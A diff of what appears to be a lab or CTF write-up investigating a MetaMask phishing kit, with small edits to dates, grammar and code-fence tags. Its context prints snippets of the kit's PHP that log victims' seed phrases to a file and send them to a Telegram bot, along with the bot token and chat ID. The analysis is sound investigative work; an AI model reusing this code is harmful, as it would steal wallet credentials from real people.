@@ -4,7 +4,7 @@ draft: false
 date: 2026-10-30T03:16:38.930Z
 categories:
   - Writeup
-lastmod: 2026-11-03T09:51:14.207Z
+lastmod: 2026-11-03T09:54:10.486Z
 description: Nothing is that serious, so please choose peace.
 cover: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
 tags:
@@ -281,7 +281,7 @@ Let's delve into the function of both of the network shares.
 - `ADMIN$ (Administration Share)` allows remote administrators with proper credentials to manage system files, deploy updates, or inspect configuration settings across the network without needing physical access to the machine.
 - `IPC$ (Inter-Process Communication Share)` facilitates inter-process communication, named pipe connections, remote procedure calls (RPC), and authentication/permission checks between networked computers before other standard shares can be accessed.
 
-That said, we have the answer to Q5 and Q6.
+That said, we now have the answer to Q5 and Q6.
 
 `Answer: ADMIN$`
 
@@ -433,7 +433,7 @@ I tried to click on those wallets one by one, but there are no responses, except
 
 This folder also contains `metamask.php`, making the next two questions pretty much no-brainers.
 
-```
+```php
 <?php
 
 $request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
@@ -485,7 +485,7 @@ sendTel($message);
 
 Upon inspecting the PHP code:
 
-```
+```php
 $request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
 $array = json_decode($request);
 $geo = $array->country->name_en;
@@ -497,7 +497,7 @@ I know nothing of `Sypex Geo`, but:
 
 - `http://api...` resembles some kind of services
 - There is `$request`, and `$array`, `$geo`, `$city`, `$date`, all of which seems to extract sensitive geographical information.
-- The `geo` in `sypexgeo` may stands for `geography`.
+- The `geo` in `sypexgeo` may stand for `geography`.
 
 > Sypex Geo is a high-speed, lightweight tool used to identify a visitor's country, region, city, and geographic coordinates from an IP address
 
@@ -505,7 +505,7 @@ I know nothing of `Sypex Geo`, but:
 
 **Q5. How many seed phrases were already collected?**
 
-```
+```php
 file_get_contents($filename);
 $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
 @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);
@@ -522,7 +522,7 @@ I suppose the phrases are stored in `/log/log.txt`
 
 **Q7. Which medium was used for credential dumping?**
 
-```
+```php
 $filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
 ```
 
@@ -530,7 +530,7 @@ $filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&
 
 **Q8. What is the token for accessing the channel?**
 
-```
+```php
 $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10";
 ```
 
@@ -538,7 +538,7 @@ $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10";
 
 **Q9. What is the Chat ID for the phisher's channel?**
 
-```
+```php
 $id = "5442785564";
 ```
 
